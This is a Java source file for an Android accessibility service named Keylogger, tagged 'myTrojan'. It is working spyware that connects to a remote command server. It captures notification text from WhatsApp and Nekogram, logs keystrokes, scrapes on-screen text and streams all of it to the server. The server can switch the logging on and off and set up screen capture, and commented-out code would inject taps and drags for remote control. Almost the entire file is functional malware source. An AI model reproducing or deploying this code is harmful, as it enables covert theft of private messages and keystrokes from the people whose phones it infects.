package com.example.activmon;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Path;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityEventSource;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.concurrent.Executor;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class Keylogger extends AccessibilityService {
    private static boolean START = false;
    final String TAG = "myTrojan";
    public static boolean SCOKET_FLAG = true;
    private final String sockEvt = "logger";
    private Socket sock;
    public static Intent intent;
    public static int resCode;
    private Boolean isonWA = false;
    public Handler handler = new Handler();
    public Handler gestureHandler = new Handler();
    public String name;

    private HashSet<String> previousData;

    public static void start(){
        START = true;
    }
    public static void stop(){
        START = false;
    }

    private String charToString(List<CharSequence> cs){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : cs) sb.append(s);
        return sb.toString();
    }
  /*  @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  click(float x, float y){
        Log.d(TAG, "dispatching event click "+x+" "+y);
        Path p = new Path();
        p.moveTo(x,y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,100,50));
        dispatchGesture(builder.build(),null,gestureHandler);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  drag(float x1, float y1,float x2,float y2){
        Log.d(TAG, "dispatching event drag "+x1+" "+y1+" "+x2+" "+y2);
        Path p = new Path();
        p.moveTo(x1,y1);
        p.lineTo(x2,y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,100,100));
        dispatchGesture(builder.build(),null,gestureHandler);
    }*/

    @Override
    protected void onServiceConnected(){
//      Log.d(TAG,"[+] Connected "+START);
        if(START){
//          Log.d(TAG,"[+] Connected");
            if(SCOKET_FLAG){
                sock.emit(sockEvt,"[+] Connected");
            }
        }
        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent aEvt) {
        if(START) {
            DataFilter dataFilter = new DataFilter();
            StringBuilder message = new StringBuilder();
            String evts = charToString(aEvt.getText());
            if (aEvt.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                if (aEvt.getPackageName().toString().equals("com.whatsapp") || aEvt.getPackageName().toString().equals("tw.nekomimi.nekogram") || aEvt.getPackageName().toString().equals("com.whatsapp.w4b")){
                    if (!aEvt.getText().isEmpty()) {
                        for (CharSequence subText : aEvt.getText()) {
                            message.append(subText);
                        }
                        if (message.toString().contains("Message from")){
                            name=message.toString().substring(13);
                        }
                        //sock.emit("notif","[N] "+ aEvt.getPackageName().toString() + " | " + message);
                    }
                }
                sock.emit("notif","[N] "+ aEvt.getPackageName().toString() + " | " + evts);
            }
            if (aEvt.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String keyboardName = Settings.Secure.getString(getContentResolver(), Settings.Secure.DEFAULT_INPUT_METHOD);
                if (aEvt.getPackageName() != null && !aEvt.getPackageName().toString().equals(keyboardName.split("/")[0])) {
                    isonWA = (aEvt.getPackageName().toString().equals("com.whatsapp") || aEvt.getPackageName().toString().equals("com.whatsapp.w4b"));
                }
                sock.emit("isonwa","[APP] User is on Whatsapp : " + isonWA, isonWA);
            }
            if (aEvt.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && isonWA){
                sock.emit("keylog", evts);
            }

            AccessibilityNodeInfo aEvent = aEvt.getSource();

            if (SCOKET_FLAG && isonWA && aEvent != null) {
                StringBuilder text = new StringBuilder();
                getTextFromNode(aEvent, text);
                String filteredData = dataFilter.filterData(String.valueOf(text));
                if (filteredData != null){
                    sock.emit(sockEvt, "Onscreen Text : " + filteredData);
                }
            }
        }
    }

    private void getTextFromNode(AccessibilityNodeInfo nodeInfo, StringBuilder text) {
        if (nodeInfo.getChildCount() == 0) {
            if (nodeInfo.getText() != null && nodeInfo.getText().length() > 0) {
                text.append(nodeInfo.getText());
                text.append("\n");
            }
        } else {
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo childNode = nodeInfo.getChild(i);
                if (childNode != null) {
                    getTextFromNode(childNode, text);
                    childNode.recycle();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        if(START){
            if (SCOKET_FLAG){
                sock.emit(sockEvt,"[-] Interrupt");
            }
//            Log.d(TAG,"[-] Interrupt");
        }

    }

    @Override
    public void onDestroy() {
        if (START && SCOKET_FLAG) {
            sock.emit(sockEvt, "[-] Disconnect");
            sock.disconnect();
        }
        super.onDestroy();
    }


    @Override
    public void onCreate() {
        new Thread(() -> {
            @SuppressLint("HardwareIds") String android_device_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            // Connecting with server
            try {
                Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),android_device_id,Integer.parseInt(getString(R.string.reconnectTime)));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            sock = Connecting.getSock();

            sock.on("*", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d("debugsock", Arrays.toString(args));
                }
            });

            // Ping Handler
            sock.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    //JSONArray array = new JSONArray((String) args[0]);
                    if(Arrays.toString(args).equals("start")){
                        //Pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
                        Pinger.start();
                    }else{
                        Pinger.stop();
                    }
                }
            });

            // Logger Handler
            sock.on("logger", args -> {
                if (args[0] instanceof JSONArray) {
                    JSONArray jsonArray = (JSONArray) args[0];
                    try {
                        String message = jsonArray.getString(0);
                        if (message.equals("start")) {
                            Log.i("LoggerStats", "Logger status started");
                            Keylogger.start();
                        } else {
                            Log.i("LoggerStats", "Logger status stopped");
                            Keylogger.stop();
                        }
                    } catch (JSONException e) {
                        // Handle the exception if the element is not a string
                        Log.e("LoggerStats", "Error parsing JSON message", e);
                    }
                } else if (args[0] instanceof String) {
                    String message = (String) args[0];
                    // Handle the case where args[0] is a String
                } else {
                    // Handle other data types or unexpected input
                    Log.w("LoggerStats", "Unexpected data type received");
                }
            });


            // Screen Handler
            sock.on("screen", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    // Setting up the Screen capture Module
                    MediaProjectionManager mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    MediaProjection mProjection = mProjectionManager.getMediaProjection(resCode,intent);
                    Capture.setup(sock, getApplicationContext(), mProjection,handler,5);
                    try {
                        Log.d(TAG,(String)args[0] );
                        JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                        if(array.getString(0).equals("start")){
                            //Capture.start();
                            Log.d(TAG, "starting");
                        }else{
                            //Capture.stop();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });


            // Mouse Handler
            /*sock.on("mouse", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
//                            Log.d(TAG, ((JSONObject) args[0]).toString());
                        JSONObject values = new JSONObject(data.getString("points"));
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            if(data.getString("type").compareTo( "click") == 0){
                                click(Float.parseFloat(values.getString("x")),Float.parseFloat(values.getString("y")));
                            }else{
                                drag(Float.parseFloat(values.getString("x1")),Float.parseFloat(values.getString("y1")),Float.parseFloat(values.getString("x2")),Float.parseFloat(values.getString("y2")));
                            }
                        }
                    } catch (Exception e) {
                        Log.d(TAG, e.getMessage());
                    }
                }
            });*/

        }).start();
        super.onCreate();
    }
}
